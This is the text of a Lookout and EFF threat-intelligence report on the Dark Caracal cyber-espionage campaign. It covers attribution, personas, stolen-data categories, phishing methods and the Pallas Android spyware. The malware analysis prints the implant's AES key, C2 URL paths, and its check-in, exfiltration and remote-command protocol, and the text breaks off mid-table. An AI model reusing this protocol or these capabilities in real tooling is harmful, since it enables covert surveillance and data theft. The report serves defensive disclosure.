{
    "title": "Lookout_Dark-Caracal_srr_20180118_us_v.1.0",
    "text": "  1\nDark Caracal\nCyber-espionage at a Global ScaleSECURITY RESEARCH REPORT  2\nContents\nExecutive Summary 1\nKey Findings 2\nTimeline  2\nBackground 4\nLebanon’s General Directorate of General Security (GDGS)  4\nLocating Attacker Facilities  5\nTest Devices  5\nWi-Fi Networks 5\nLocation Information from IP Addresses 6\nIdentities: Attacker Personas 7\nNancy Razzouk and Hassan Ward 7\nHadi Mazeh 8\nRami Jabbour 8\nProlific Activity 9\nExfiltrated Data 9\nAndroid Malware Content 12\nWindows Malware Content 15\nPatterns of Attacks 17\nThe Initial Compromise 17\nSocial Engineering and Spear-Phishing  19Surveillanceware — Mobile Capabilities  21\nPallas — Dark Caracal’s Custom Android Samples 21\nC2 Communications with Malware Implants  23\nPrevious Use of FinFisher Spyware 30\nSurveillanceware — Desktop Components  31\nBandook  31\nCrossRAT  34\nInfected Documents 36\nOther Samples 37\nInfrastructure  38\nPrimary Command and Control Server  39\nWatering Hole Server  41\nPhishing Domains  41\nWindows C2 Servers  44\nAppendix  46\nIndicators of Compromise and Actor Tracking  46\nMobile Implant Apps 47\nDesktop Implant Apps  48  1\nSECURITY RESEARCH REPORTExecutive Summary\nAs the modern threat landscape has evolved, so have the actors. The barrier to entry for cyber-warfare has continued to \ndecrease, which means new nation states — previously without significant offensive capabilities1 — are now able to build and \ndeploy widespread multi-platform cyber-espionage campaigns.\nThis report uncovers a prolific actor with nation-state level advanced persistent threat (APT) capabilities, who is exploiting targets \nglobally across multiple platforms. The actor has been observed making use of desktop tooling, but has prioritized mobile \ndevices as the primary attack vector. This is one of the first publicly documented mobile APT actors known to execute espionage \non a global scale. \nLookout and Electronic Frontier Foundation (EFF) have discovered Dark Caracal2, a persistent and prolific actor, who at the time \nof writing is believed to be administered out of a building belonging to the Lebanese General Security Directorate in Beirut. At \npresent, we have knowledge of hundreds of gigabytes of exfiltrated data, in 21+ countries, across thousands of victims. Stolen \ndata includes enterprise intellectual property and personally identifiable information. We are releasing more than 90 indicators  \nof compromise (IOC) associated with Dark Caracal including 11 different Android malware IOCs; 26 desktop malware IOCs \nacross Windows, Mac, and Linux; and 60 domain/IP based IOCs.\nDark Caracal targets include individuals and entities that a nation state might typically attack, including governments, military \ntargets, utilities, financial institutions, manufacturing companies, and defense contractors. We specifically uncovered data \nassociated with military personnel, enterprises, medical professionals, activists, journalists, lawyers, and educational institutions \nduring this investigation. Types of data include documents, call records, audio recordings, secure messaging client content, contact information, text messages, photos, and account data. \nThe joint Lookout-EFF investigation began after EFF released its Operation Manul report , highlighting a multi-platform espionage \ncampaign targeted at journalists, activists, lawyers, and dissidents who were critical of President Nursultan Nazarbayev’s regime \nin Kazakhstan. The report describes malware and tactics targeting desktop machines, with references to a possible Android \ncomponent. After investigating related infrastructure and connections to Operation Manul, the team concluded that the same \ninfrastructure is likely shared by multiple actors and is being used in a new set of campaigns.\nThe diversity of seemingly unrelated campaigns that have been carried out from this infrastructure suggests it is being used \nsimultaneously by multiple groups. Operation Manul clearly targeted persons of interest to Kazakhstan, while Dark Caracal has \ngiven no indication of an interest in these targets or their associates. This suggests that Dark Caracal either uses or manages the infrastructure found to be hosting a number of widespread, global cyber-espionage campaigns. \nSince 2007, Lookout has investigated and tracked mobile security events across hundreds of millions of devices around the world. \nThis mobile espionage campaign is one of the most prolific we have seen to date. Additionally, we have reason to believe the \nactivity Lookout and EFF have directly observed represents only a small fraction of the cyber-espionage that has been conducted \nusing this infrastructure.\n1 https://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf\n2 In keeping with traditional APT naming, we chose the name “Caracal” (pronounced [kar-uh-kal]) because the feline is native to Lebanon and because this group has \nremained hidden for so long. From the Wikipedia entry “the caracal is highly secretive and difficult to observe” and “is often confused with [other breeds of cat].” The \nnaming further builds on EFF’s “Operation Manul,” another feline reference. We like cats.  2\nSECURITY RESEARCH REPORTKey Findings\nLookout and EFF researchers have identified a new threat actor,  \nDark Caracal. \n• Our research shows that Dark Caracal may be administering its tooling out of the headquarters of the General Directorate of General Security (GDGS) in Beirut, Lebanon.\n• The GDGS gathers intelligence for national security purposes and for its offensive cyber capabilities according to previous reports.\n• We have identified four Dark Caracal personas with overlapping \nTTP (tools, techniques, and procedures).\n• Dark Caracal is using the same infrastructure as was previously \nseen in the Operation Manul campaign, which targeted journalists, \nlawyers, and dissidents critical of the government of Kazakhstan.\nDark Caracal has been conducting a multi-platform, APT-level \nsurveillance operation targeting individuals and institutions globally. \n• Dark Caracal has successfully run numerous campaigns in parallel and we know that the data we have observed is only a small fraction of the total activity. \n• We have identified hundreds of gigabytes of data exfiltrated from thousands of victims, spanning 21+ countries in North America, Europe, the Middle East, and Asia. \n• The mobile component of this APT is one of the first we’ve seen executing espionage on a global scale.\n• Analysis shows Dark Caracal successfully compromised the \ndevices of military personnel, enterprises, medical professionals, \nactivists, journalists, lawyers, and educational institutions. \n• Dark Caracal targets also include governments, militaries,  utilities, financial institutions, manufacturing companies, and \ndefense contractors.\n• Types of exfiltrated data include documents, call records, audio \nrecordings, secure messaging client content, contact information, \ntext messages, photos, and account data. Dark Caracal Activity Timeline\nJan. 2012\nNov. 2012\nMar. 2014\nNov. 2014\nDec. 2015\nJun. 2015\nDec. 2016Aug. 2016Jun. 2016Custom FinFisher mobile \nsample createdFirst mobile surveillance \ncampaign, oldb, launched\narablivenews[.]com expires and \nis decommissionedop13@mail[.]com registers phishing \ndomain arablivenews[.]com\nop13@mail[.]com registers \narabpublisherslb[.]com domain\nOperation Manul phishing \nemails first seen\nsecureandroid[.]info watering \nhole goes live.EFF releases “Operation Manul” reportgmailservices[.]org and \ntwiterservices[.]org WHOIS \ndetails registered as Hadi \nMazeh and op13@mail[.]com\nOct. 2016 op13@mail[.]com registered \narablivenews[.]com. Threat  \nConnect report3 suggests  \ndomain may be related to “APT 28”\n3 “https://www.threatconnect.com/blog/how-to-investigate-incidents-in-threatconnect/”Dec. 2016 Second mobile surveillance campaign, wp7, launched  3\nSECURITY RESEARCH REPORT• Dark Caracal follows the typical attack chain for cyber-espionage.  \nThey rely primarily on social media, phishing, and in some cases \nphysical access to compromise target systems, devices, and accounts.\nDark Caracal uses tools across mobile and desktop platforms.\n• Dark Caracal uses mobile as a primary attack platform. \n• Dark Caracal purchases or borrows mobile and desktop tools from \nactors on the dark web.\n• Lookout discovered Dark Caracal’s custom-developed mobile surveillanceware (that we call Pallas) in May 2017. Pallas is found in trojanized Android apps. \n• Dark Caracal has also used FinFisher, a tool created by a “lawful \nintercept” company that is regularly abused by other nation-state actors. \n• Dark Caracal makes extensive use of Windows malware called \nBandook RAT. Dark Caracal also uses a previously unknown, multi-\nplatform tool that Lookout and EFF have named CrossRAT, which is \nable to target Windows, OSX, and Linux.\nDark Caracal uses a constantly evolving, global infrastructure.\n• Lookout and EFF researchers have identified parts of Dark Caracal’s infrastructure, providing us with unique insight into  its global operations.\n• The infrastructure operators prefer to use Windows and XAMPP software on their C2 servers rather than a traditional LAMP stack, which provides a unique fingerprint when searching for related infrastructure.\n• Lookout and EFF have identified infrastructure shared by Operation Manul and Dark Caracal as well as other actors.\n• Attributing Dark Caracal was difficult as the actor employs \nmultiple types of malware, and our analysis suggests the \ninfrastructure is also being used by other groups.\nLookout and EFF are releasing more than 90 indicators of \ncompromise (IOC):\n• 11 Android malware IOCs\n• 26 desktop malware IOCs\n• 60 domains, IP Addresses, and WHOIS informationDark Caracal Activity Timeline (cont.) \nMar. 2017\nApr. 2017\nJun. 2017\nJul. 2017\nJul. 2017\nJul. 2017\nAug. 2017\nAug. 2017\nAug. 2017\nSep. 2017\nDec. 2017\nJan. 2018Sep. 2017Third mobile surveillance \ncampaign, wp8, launched\nFourth mobile surveillance \ncampaign, wp9, launched\nFifth and sixth mobile surveillance \ncampaigns, wp10 and wp10s, launched\nwp8 campaign ceases collecting data\nadobeair[.]net taken down for \nseveral dayss\nadobeair[.]net resumes operations\nwp9, wp10, and wp10s campaigns \ncease collecting data\nadobeair[.]net WHOIS details \nchanged to Nancy Razzouk, \nop13@mail[.]com, Lebanon\noldb campaign ceases collecting data\nwp7 campaign ceases collecting data\nSecureanroid[.]info’s domain  \nname expires\nDark Caracal made publicadobeair[.]net changes hosting  \nand is secured against data leaks  4\nSECURITY RESEARCH REPORTBackground\nLebanon’s General Directorate of General \nSecurity (GDGS)\nDevices for testing and operating the campaign were traced back to a building \nbelonging to the Lebanese General Directorate of General Security (GDGS), one of \nLebanon’s intelligence agencies. Based on the available evidence, it is likely that the \nGDGS is associated with or directly supporting the actors behind Dark Caracal.  \nPrevious Cyberespionage\nEFF first identified elements of this infrastructure in its August 20164 report on Operation \nManul. The report details a series of attacks targeting journalists and political activists \ncritical of Kazakhstan’s authoritarian government, along with their family members, \nlawyers, and associates. EFF’s research noted references to Android components found \non the infrastructure; however, no samples had been discovered at the time of the \nreport’s release. Lookout has since acquired Android samples used by Dark Caracal that \nbelong to what Lookout researchers have named the Pallas malware family. \nCitizen Lab previously flagged the General Directorate of General Security in a 2015 \nreport as one of two Lebanese government organizations using the FinFisher spyware5. \nThe report cites evidence showing that the GDGS, along with other state actors around the world, had active campaigns using FinFisher infrastructure and tools. However, the \nreport did not specify whether the spyware used was the mobile version of FinFisher. \nOur investigation resulted in the discovery of at least one FinFisher implant for Android, \nwhich corroborates Citizen Lab’s previous research. The sample’s hash is provided in \nthe appendix of this report. We also uncovered new desktop surveillance software \ndeveloped potentially by Dark Caracal themselves, a developer associated with the \nGDGS, or a private contractor group.\nThe intent of bringing forth these findings is to reveal newly discovered evidence of a new \nnation-state actor compromising the devices of military personnel, enterprises, medical \nprofessionals, activists, journalists, lawyers, and educational institutions. Our review and \ndisclosure of this matter follows industry practices, including sharing our findings with \nappropriate government authorities, industry partners and the public at large.\n4 https://www.eff.org/files/2016/08/03/i-got-a-letter-from-the-government.pdf\n5 https://citizenlab.ca/2015/10/mapping-finfishers-continuing-proliferation/  5\nSECURITY RESEARCH REPORTLocating Attacker Facilities\nWe correlated information from test devices and Wi-Fi networks to determine \nthe location of Dark Caracal’s facilities. \nTest Devices \nDark Caracal used a series of test devices to confirm that its malware implants and C2 infrastructure work correctly. Identifying these devices helped us to \ndetermine Dark Caracal’s likely location inside the GDGS building. \nDistinguishing between test and target devices can be tricky. After analyzing \ndata from the infrastructure, we noticed that a subset of the compromised \ndevices contained similar email, Viber, Primo, Telegram, and Whatsapp accounts. \nThese data points allowed us to focus on a select few devices that were unique \namong the thousands we saw. Additionally, these devices contained a minimal \namount of (if any) real content in the exfiltrated text messages, contacts, and \napplication data, which led us to conclude they were likely test devices.\n Figure 1: A picture of the GDGS building in  \nBeirut, Lebanon from where we have located  \nDark Caracal operating\nWi-Fi Networks\nWithin the cluster of test devices we noticed what could be unique Wi-Fi networks. Knowing that Wi-Fi networks can be used for location positioning, we used that data to geo-locate where these devices may have been by keying off network identifiers. We \nspecifically focused on the Wi-Fi network SSID Bld3F6 . Using the Wi-Fi geolocation service Wigle.net we saw these test device \nWi-Fi networks mapped to Beirut. We also noticed Wi-Fi networks with SSID Bld3F6  mapped near the General Security building \nin Beirut, Lebanon.\nFigure 2: Google map of the GDGS Building in Beirut  \nLeft: Data as observed from Wigle.net for SSID: Bld3F6  |   Right: Data confirming location of SSID: Bld3F6\n  6\nSECURITY RESEARCH REPORT6 https://en.wikipedia.org/wiki/Telecommunications_in_LebanonLocation Information from IP Addresses\nThroughout the course of this investigation we observed logins into the administrative console of the C2 server come from three \nIP addresses. The IP addresses are all from Ogero Telecom6, which is owned by the Government of Lebanon. We geo-located two \nof the IP addresses just south of the GDGS’s building (probably a switching or central hub for Ogero).\nFigure 3: The location of IP addresses that logged into the adobeair[.]net admin console between July and September 2017  7\nSECURITY RESEARCH REPORTNancy Razzouk and Hassan Ward\nWe identified Nancy Razzouk listed alongside the op13@mail[.]com email address in domain WHOIS information. We also found \nthis name in signer content for the Windows malware7 that communicates with adobeair[.]net.\nFigure 4: Signer content for Windows malware\nThe contact details for Nancy present in WHOIS information matched the public listing for a Beirut-based individual by that name. When we looked at the phone number associated with Nancy in the WHOIS information, we discovered the same number \nlisted in exfiltrated content and being used by an individual with the name Hassan Ward. \n7 SHA-256 HASH: d57701321f2f13585a02fc8ba6cbf1f2f094764bfa067eb73c0101060289b0ba\nIdentities: Attacker Personas\nThe infrastructure used by Dark Caracal revealed several different associated personas. This resulted in the team linking four \ndifferent aliases, two domains, and two phone numbers to this infrastructure. At the center of these personas is the email  \naddress op13@mail[.]com which has appeared at various stages in the historical WHOIS information of Dark Caracal domains \n(see: Timeline). \nAliases associated with op13@mail[.]com include Nancy Razzouk, Hadi Mazeh, and Rami Jabbour. All of the physical addresses  \nlisted in the WHOIS domain registrations associated with op13@mail[.]com tend to cluster around the SSID: Bld3F6  Wi-Fi \nlocations. This is near the General Security building in Beirut.  8\nSECURITY RESEARCH REPORTop13@mail.com\nfbarticles.com\ngmailservices.org\ntwiterservices.orgarabpublisherslb.com\nfacebookservices.orgHadi MazehHadi Mazeh\nDuring July 2017, Dark Caracal’s internet service provider took the adobeair[.]net command and control server offline. Within \na matter of days, we observed it being re-registered to the email address op13@mail[.]com with the name Nancy Razzouk. This \nallowed us to identify several other domains listed under the same WHOIS email address information, running similar server \ncomponents. The WHOIS name field, however, listed several entries with the name Hadi Mazeh. This suggests that either multiple \nindividuals are using the op13 email address or the owner has several aliases that he or she uses with it. \nRami Jabbour\nWe determined the actor behind the op13 email address also registered the domain arablivenews[.]com and provided the name \nRami Jabbour. Address details listed in WHOIS information for this specific entry are Salameh Blg, Museum Str, and Mathaf, which \nappears to be in close proximity to where we have seen test devices in Beirut.Figure 5: Aliases associated with the op13 email address  9\nSECURITY RESEARCH REPORTProlific Activity\nThroughout this investigation, Lookout and EFF researchers have gained unique insight into the global operations of Dark \nCaracal. This has primarily been possible due to command and control infrastructure operators allowing public access to data \nstolen from compromised devices and systems.\nSince we first gained visibility into attacker infrastructure in July 2017, we have seen millions of requests being made to it from \ninfected devices. This demonstrates that Dark Caracal is likely running upwards of six distinct campaigns in parallel, some of \nwhich have been operational since January 2012. \nDark Caracal targets a broad range of victims. Thus far, we have identified members of the military, government officials, medical \npractitioners, education professionals, academics, civilians from numerous other fields, and commercial enterprises as targets.\nExfiltrated Data\n*****\nBookmarks &\nBrowsing History\nInstalled\nApplications\nAudio\nRecordingsAccount\nInformation\nCallRecords\nContacts\nImagesSMS\nMessages\nWhatsApp, Telegram and Skype databases\nLegal and Corporate \nDocumentation\nFile and Directory \nListingsWi-Fi\nDetails\nFigure 6: A summary of some of the types of content Dark Caracal exfiltrated from victims on both Android and Windows\nNot only was Dark Caracal able to cast its net wide, it was also able to gain deep insight into each of the victim’s lives. It did this \nthrough a series of multi-platform surveillance campaigns that began with desktop attacks and pivoted to the mobile device. \nStolen data was found to include personal messages and photos as well as corporate and legal documentation. In some cases, \nscreenshots from its Windows malware painted a picture of how a particular individual spent his evenings at home.  10\nSECURITY RESEARCH REPORTWe found the largest collection of data from a single command and control server that operated under the domain adobeair[.]\nnet. Over a short period of observation, devices from at least six distinct Android campaigns communicated with this domain \nresulting in 48GB of information being exfiltrated from compromised devices. Windows campaigns contributed a further 33GB of stolen data. The remainder of the data contained desktop malware samples, spreadsheet reports on victims, and other files.\nVictims were found to speak a variety of languages and were also from a wide range of countries. We discovered messages \nand photos in Arabic, English, Hindi, Turkish, Thai, Portuguese, and Spanish in the examined data. According to our analysis, \ninfrastructure contained exfiltrated data from individuals residing in:Figure 7: Split of exfiltrated data found \non just the command and control server adobeair[.]net. From 81GB of stolen data, the majority was found to be from \ncampaigns run against mobile devices\n81 GB\n81 GB59.3%\nAndroid\nCampaigns\n40.7%\nWindowsCampaignsSplit of exﬁltrated content on adobeair.net\nChina\n France\n Germany\n India\n Italy\n Jordan\n Lebanon\nNepal\n Netherlands\n Pakistan\n Philippines\n Qatar\n Russia\n Saudi Arabia\nSouth Korea\n Switzerland\n Syria\n Thailand\n United States\n Venezuela\n Vietnam  11\nSECURITY RESEARCH REPORT\nBased on both the mobile and desktop campaigns we observed, we believe the attacker first exfiltrated information in January \n2012. At the time of writing this report, it looks as though Dark Caracal is still uploading data from its spy campaigns, according  \nto the servers we are tracking.8Figure 8: Observed locations of compromised devices\nFigure 9: Amount of exfiltrated content (as represented by “count” in the graph above) being uploaded for certain campaigns on adobeair[.]net over time for 2017\n8 Despite the internet service provider taking the command and control server down in July 2017, the infrastructure reappeared online again after a few days. The dip \nin data exfiltration due to the takedown can be observed in Figure 9 at the beginning of August. The average number of files uploaded to the server increases steadily \nwith time.  12\nSECURITY RESEARCH REPORTAndroid Malware Content\nThe Android malware family mainly trojanizes messaging and security applications and, once it compromises a device, it is \ncapable of collecting a range of sensitive user information. This includes recorded audio, call logs, conversations from popular \nchat applications, location information, browsing history, device specific metadata, contacts, and much more. \nEach Android malware sample contains a hard coded identifier that we believe represents the campaign to which it belongs. \nWhen a Dark Caracal operator instructs an infected device to upload sensitive data, it is stored on the attacker infrastructure \nunder this campaign. While investigating this adversary, we observed content distributed across six different campaigns. In \nthis report, we refer to these campaigns by the name of the directory to which infected devices uploaded victim data. These \ncampaigns are listed below, along with the number of victim devices we believe Dark Caracal compromised while we were \nobserving its operations:\n• /oldb - 28 perceived test devices, 454 potential victim devices\n• /wp7 - 4 perceived test devices, 117 potential victim devices\n• /wp8 - 1 perceived test device, 4 potential victim devices\nWe did not attempt to identify targets and consider that beyond the scope of this report.\n*****486,766\nSMS Texts\n32.4%\n252,982\nContacts16.9%\n150,266\nCall Records10.0%45,264\nAndroid Application\nDetails\n3.0%92,35\nBrowsing History URLs6.2%1547\nAuthentication Accounts0.1%206,461\nUnique Wi-Fi SSIDs13.8%46\nDirectories0.0%264,535\nFiles17.6%• /wp9 - 11 potential victim devices\n• /wp10 - 1 potential test device, 2 potential victim devices\n• /wp10s - 13 potential test devices, 21 potential victim devices\nAn overview of exfiltrated data from the Android campaigns can be seen in the figure below. \nFigure 10: Distribution of data from the Android campaigns  13\nSECURITY RESEARCH REPORTExfiltrated data can be divided into the following categories of information:\n• SMS messages  - SMS messages made up some of the more meaningful exfiltrated data. Messages included personal texts, \ntwo-factor authentication and one-time password pins, receipts and airline reservations, and company communications. \nSome pin codes were within their validity window at the time of writing this report.\nFigure 11: Exfiltrated SMS texts detailing OTPs, receipts, and Facebook notifications  14\nSECURITY RESEARCH REPORT• Contact Lists  - This data included numbers, names, addresses, bank passcodes, PIN numbers, how many times each contact \nwas dialed, and the last time the contact was called.\n• Call logs  - This data included a full record of incoming, outgoing, and missed calls along with the date and duration  \nof the conversation. \n• Installed Applications  - This data included app names and version numbers.\n• Bookmarks and Browsing History  - This data included bookmarks and browsing history from web pages. This data was \nseen in only one Android campaign called oldb, but it clearly identified victims that were active in political discourse.\n• Connected Wi-Fi Details  - This data included observed Wi-Fi access point names, BSSIDs, and signal point strength. \n• Authentication Accounts  - This data included the login credentials and which applications are using it. \n• File and Directory Listings - This data included a list of personal files, downloaded files, and temporary files, including  \nthose used by other applications.\n• Audio Recordings and Audio Messages - This data included audio recordings of conversations, some of which identified \nindividuals by name. \n• Photos  - This data included all personal and downloaded photographs, including profile pictures.Figure 12: Contacts exfiltrated from 3 victims’ Android devices can be seen to contain corporate numbers, personal numbers, and Visa credit card numbers\n  15\nSECURITY RESEARCH REPORT\nWindows Malware Content\nDark Caracal’s use of Windows malware includes a wider range of command and control infrastructure beyond adobeair[.]net.  \nIts methods and data collection, however, are similar to the Android malware.\nExfiltrated data from the Windows malware included the following general categories:\n• Desktop  Screenshots - This data included full screenshots taken at regular intervals and uploaded to adobeair[.]net .  \nBy observing these images, it is disturbingly simple to watch a victim go about his daily life and follow that individual  \nevery step of the way.\nFigure 13: A screenshot exfiltrated from victim’s Windows device on adobeair[.]net\n• Skype Logs Databases - The data included the entire Skype AppData folder for certain victims, including messaging databases.\n• Photos - This data included complete contents of the ‘Pictures’ folder from compromised Windows machines. It is common to see smartphone photos backed up to this location, which most often contains personal photographs of family and friends taken by the individual being targeted.   16\nSECURITY RESEARCH REPORT\nFigure 14: An example of corporate documentation, which details the addresses and telephone numbers of customers for a shipping company• iPhone Backups  - This data included an entire unencrypted backup of a victim’s iPhone.\n• File Listings  - This data included all default Windows folders and file listings.\n• Corporate and Legal Documentation - This data included a large collection of company-specific documents. Specifically, \nwe discovered these on another live command and control server, planethdx[.]com .  17\nSECURITY RESEARCH REPORTExﬁltrated\nDataPhishing messages\nWhatsApp\nPhysical access  Phishing messages\nFacebook group\nTrojanized Android Apps\nWatering hole server:\nsecureandroid[.]info\nC2 server\nadobeair[.]netPhishing server:\nSet up for credential harvesting\nFake Google domain\nFake Facebook domain\nFake Twitter domainPatterns of Attacks\nDark Caracal follows the typical attack chain for client-side cyber-espionage. Mobile tools include a custom written Android \nsurveillanceware implant Lookout named Pallas9 and a previously unknown FinFisher sample. The group’s desktop tools include \nthe Bandook malware family and a newly discovered desktop surveillanceware tool that we have named CrossRAT, which is able \nto infect Windows, Linux, and OS X operating systems. \nThe Initial Compromise\nFigure 15: The Android malware infrastructure \nis designed to attract victims into the campaign through two different mechanisms: phishing campaigns that separately lead to a watering hole \nserver (secureandroid[.]info) and a server designed \nto accept credentials via a spoofed login\n9 Pallas’ Cat is another name for “Manul,” a reference to EFF’s Op Manul campaign on this actorDark Caracal relies primarily on social engineering via posts on a Facebook group and WhatsApp messages in order to \ncompromise target systems, devices, and accounts. At a high-level, the attackers have designed three different kinds of phishing \nmessages, the goal of which is to eventually drive victims to a watering hole controlled by Dark Caracal.   18\nSECURITY RESEARCH REPORTThe group distributes trojanized Android \napplications with the Pallas malware through its \nwatering hole, secureandroid[.]info. Many of these \ndownloads include fake messaging and privacy-\noriented apps.\nThere is also some indication that Dark Caracal \nhas used physical access in the past to install the \nAndroid malware. Figure 16: secureandroid[.]info’s app download page\nFigure 17: A text message found \nfrom a possible victim’s device  19\nSECURITY RESEARCH REPORTSocial Engineering and Spear-Phishing\nDark Caracal uses phishing messages through popular applications, such as WhatsApp, in order to direct people to the \nwatering hole.\nDark Caracal infrastructure hosts phishing sites, which look like login portals for well known services, such as Facebook, Twitter, \nand Google. We found links to these pages in numerous Facebook groups that included “Nanys” in their titles. These groups are \nlisted in the appendix. Figure 18:  \nLeft: Extracted from WhatsApp  \nmessages database \nRight: Facebook group links to  \nwatering hole\nFigure 19: Dark Caracal  \ncredential phishing portals\n  20\nSECURITY RESEARCH REPORTGoogle has indexed several of these phishing campaigns from the tweetsfb[.]com server. We were able to link a number of \nphishing domains dating to the mid-to-late 2016 time period from this data. We believe the attackers used these phishing servers \nto capture login credentials, hijack accounts, and to push out more spoofed messages to widen their pool of victims. \nPhishing links posted in Dark Caracal linked Facebook groups include politically themed news stories, links to fake versions of \npopular services, such as Gmail, and links to trojanized versions of WhatsApp.\nFigure 20: Google indexing of tweetsfb[.]com campaigns\nFigure 21: Dark Caracal phishing links posted on Facebook  21\nSECURITY RESEARCH REPORT\nFour Facebook profiles similar in theme “liked” the phishing groups. Dark Caracal likely used these fake profiles to initiate \ncommunication with victims and build a rapport before directing them either to content on the “Nanys” Facebook groups  \nor to the secureandroid[.]info domain directly. \nSurveillanceware — Mobile Capabilities\nPallas — Dark Caracal’s Custom Android Samples\nUsing our global sensor network, Lookout researchers identified 11 unique Android surveillanceware apps tied to the Operation \nManul campaign10. The trojanized apps still retain the legitimate functionality of the apps they spoof and behave as intended.  \nThe apps are found predominantly in trojanized versions of well-known secure messaging apps including: \n• Signal (org.thoughtcrime.securesms)\n• Threema (ch.threema.app)\n• Primo (com.primo.mobile.android.app)\n• WhatsApp (com.gbwhatsapp)\n• Plus Messenger (org.telegram.plus)\nWe also identified Pallas in trojanized versions of two apps aimed at users seeking to protect themselves and their data online: \n• Psiphon VPN (com.psiphon3)\n• Orbot: TOR Proxy (org.torproject.android)\n10 http://www.cmcm.com/blog/en/security/2017-08-16/1101.htmlFigure 22: Dark Caracal fake Facebook profiles  22\nSECURITY RESEARCH REPORTFinally, with help from Google’s Android Security team, we discovered Pallas lurking in several apps purporting to be Adobe Flash \nPlayer and Google Play Push for Android:\n• Flash Player (com.flashplayer.player)\n• Google Play Push (com.flashplayer.player)\nNeither the desktop nor the mobile malware tooling use zero day vulnerabilities. Pallas samples primarily rely on the permissions granted at installation in order to access sensitive user data. However, there is functionality that allows an attacker to instruct an \ninfected device to download and install additional applications or updates. Theoretically this means it’s possible for the operators \nbehind Pallas to push specific exploit modules to compromised devices in order to gain complete access. \nWe found no attacker infrastructure containing rooting packages. This highlights that, in many cases, advanced exploitation \ncapabilities like those shown by surveillance tools such as Pegasus for iOS and Chrysaor for Android (that targeted both Android\n11 \nand iOS12 devices ), are not essential, but helpful when targeting certain platforms.\n11 https://blog.lookout.com/pegasus-android\n12 https://blog.lookout.com/trident-pegasus\nPrimo\n Signal\n WhatsApp\nPlus\nMessenger\nThreema\nOrbot\nTOR Proxy\nPsiphon\nFigure 23: Dark Caracal trojanized Android apps  23\nSECURITY RESEARCH REPORTThe Pallas first stage is capable of performing the following surveillance functionality on a compromised device:\n• Take photos with front or back camera\n• Exfiltrate all text messages including those  \nreceived in the future \n• Retrieve latitude / longitude from GPS\n• Silently activate the device microphone to  capture audio\n• Retrieve contacts\n• Scan nearby Wi-Fi access points and exfiltrate information about them, including their BSSID, SSID, \nauthentication, key management, encryption schemes, signal strength, and frequency\n• Retrieve chat content from secure messaging applications (this only applies when a victim is using  a secure messaging app that has been trojanized  \nwith Pallas)• Retrieve device metadata\n• Retrieve text messages\n• Retrieve information about all accounts\n• Send an SMS to an attacker-specified number\n• Retrieve call logs\n• Retrieve messages and any corresponding  \ndecryption keys from messaging apps\n• Retrieve a list of installed packages\n• Download and install additional apps\n• Upload attacker specified files\n• Delete attacker specified files and directories\n• Harvest credentials via phishing pop-ups\nC2 Communications with Malware Implants\nAll samples belonging to the Pallas malware family have the same capabilities and functionality described in the previous \nsection. However, obfuscation did differ between them. For reference, code snippets shown in the following section \nhave been taken from a trojanized version of WhatsApp with a package name of com.gbwhatsapp  and a SHA1 hash of \ned4754effda466b8babf87bcba2717760f112455 .\nLike most other surveillanceware, communication with the C2 includes three main phases: \n1. Regular beaconing to the remote HTTP server.\n2. Handling any outstanding attacker specified commands.\n3. Exfiltration / uploading of victim data to C2 servers. \nPallas samples have a number of different entry points via broadcast receivers, specifically the C2 communications reside  in the com.receive.MySe .  24\nSECURITY RESEARCH REPORTIn all Pallas samples Lookout analyzed, domain information and URL paths are hardcoded as encrypted values. The actor uses \nAES encryption and chose to use the secret key of Bar12345Bar12345 and initialization vector of RandomInitVector, which \nappears in a post describing how to use AES encryption in Java13. \nExamples of AES encrypted, base64 encoded domains and URL paths present in some Pallas samples include:\n• krgbAdOUCGKEnuCRp5s+eE2eMWUktZQR64RBdkNoH/O0NFo9ByRTFhjqa2UX2Y9k\n• krgbAdOUCGKEnuCRp5s+eA/hX2erfMp+49exa+8zoZgMlBICjGuOSqrvGRCjgrZ4\nThese two examples decrypt to:\n• https://adobeair[.]net/wp9/add.php\n• https://adobeair[.]net/wp9/upload.php \nThe general format of Pallas requests can be written as https://adobeair[.]net/<campaign_identifier>/<add.php or upload.php>.\nThe add.php script is used for several operations, including compromised device check-ins as well as C2 instruction execution. \nWe also determined that it is able to retrieve location information (GPS data) and general metadata about a victim’s device. The \nfollowing table provides additional details around the structure of these requests. In all cases, the Content-Type header is set to application/x-www-form-urlencoded. The listed ac parameter identifies the type of request made to the C2. \n13 https://stackoverflow.com/questions/15554296/simple-java-aes-encrypt-decrypt-exampleFigure 24: Actions that trigger the Pallas malware samples to do work  25\nSECURITY RESEARCH REPORTDescriptionPurpose  \nOf The RequestHTTP Parameters(Key=Value) Required\nRetrieve data from a compromised device, \nincluding text messages, calls, contact \ninformation, Wi-Fi details, and accounts.\nParameter pr is “1” if sufficient permissions \nexis t, “0” other wise, and “111111111111”, if the \nbuild version of the device is lower than 23.Check-In with C2 ac=chkcm1\nuid=<device_id>\npr=<app_has_permisions>\nThe victim’s GPS location is communicated to \nthe C2 every 120 minutes.GPS location ac=chkcm1uid=<device_id>alt=<Latitude>\nlong=<Longtitude>\nRequest responsible for gathering general \ndevice metadata and uploading to C2. This request is triggered via several entry points \nincluding, but not limited to, the creation of the \napp on the device. General Device Information ac=iuuid=<DeviceID>imei=<DeviceID>\nnb=<None>\nos=<ReleaseBuildVersion>man=<ManufacturerModel>\nop=<NetworkOperatorName>\nwifi=<IsConnectedToNetwork>cam=” <NumberOfCameras>\nver=<versionOftheApp>\npr=<permisionsGranted>idt=<CurrentDate>\necr=<ExistAcall_record>\nResponses from C2 infrastructure to devices infected with Pallas consist of chunks of data separated by a “~!”. The following  \ntable shows the commands that are currently supported. Some of these require the victim’s device to report back to the C2  \nand/or upload files to it via HTTP POST requests. The responses to the attacker commands detailed below are handled via the \nadd.php page.   26\nSECURITY RESEARCH REPORTDescriptionC2  \nCommandHTTP Parameters(Key=Value) Required\nRetrieve all the data from a compromised device, including text message, call \ninformation, contact details, Wi-Fi data, and account information to name a few.GALL1\nToggle the call record functionality to on or off. REC2\nUpload file and directory access logs of the trojanized application to the C2  via a single file.GFILE1\nTake a picture using the front or rear camera and upload to the C2 server. CAMG1\nDownload an update from attacker infrastructure, attempt to execute it,  and notify the C2.UPD1 ac=REPXuid=<Device_ID>RP=Update Procedure Executed\nDelete an attacker-specified file from the device and notify the C2. DELF1 ac=REPX\nuid=<Device_ID>\nRP=File Deleted : <file_name>\nRetrieve an attacker-specified file from a compromised device,  uploading it to the C2.UPF1\nDownload an attacker-specified file to the target device and notify the C2. DWN1 ac=REPXuid=<Device_ID>\nRP=File Uploaded To Target : 